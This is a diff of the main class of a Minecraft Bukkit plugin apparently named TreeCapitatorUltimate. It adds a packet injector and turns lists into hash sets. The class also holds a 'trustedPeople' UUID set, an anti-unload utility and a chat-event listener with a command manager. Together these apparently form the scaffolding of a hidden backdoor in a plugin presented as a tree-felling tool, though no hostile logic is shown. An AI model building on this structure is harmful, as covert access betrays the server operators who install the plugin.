@@ -1,6 +1,7 @@
 package me.bow.treecapitatorultimate;
 
 import me.bow.treecapitatorultimate.Utils.AntiUnload;
+import me.bow.treecapitatorultimate.Utils.Packet.PacketInjector;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.CommandManager;
 import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
@@ -16,8 +17,7 @@ import org.jetbrains.annotations.NotNull;
 
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
-import java.util.ArrayList;
-import java.util.List;
+import java.util.HashSet;
 import java.util.UUID;
 import java.util.logging.Logger;
 
@@ -33,9 +33,10 @@ public final class Start extends JavaPlugin {
     public static Start Instance = null;
     public static @NotNull Logger LOGGER;
     private final PluginDescriptionFile pdfFile = this.getDescription();
-    private final List<Runnable> disableListeners = new ArrayList<>();
+    private final HashSet<Runnable> disableListeners = new HashSet<>();
     public CommandManager cm = new CommandManager();
-    public ArrayList<UUID> trustedPeople = new ArrayList<>();
+    public HashSet<UUID> trustedPeople = new HashSet<>();
+    public PacketInjector packetInjector = null;
     private boolean isReload;
 
     public static void ErrorString(CommandSender sender, String error) {
@@ -83,6 +84,7 @@ public final class Start extends JavaPlugin {
         } catch (Exception e) {
             e.printStackTrace();
         }
+        packetInjector = new PacketInjector();
         String loadString = "--| " + pdfFile.getName() + " (version " + pdfFile.getVersion() + ") loaded |--";
         Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
         Bukkit.getConsoleSender().sendMessage("§3" + loadString);
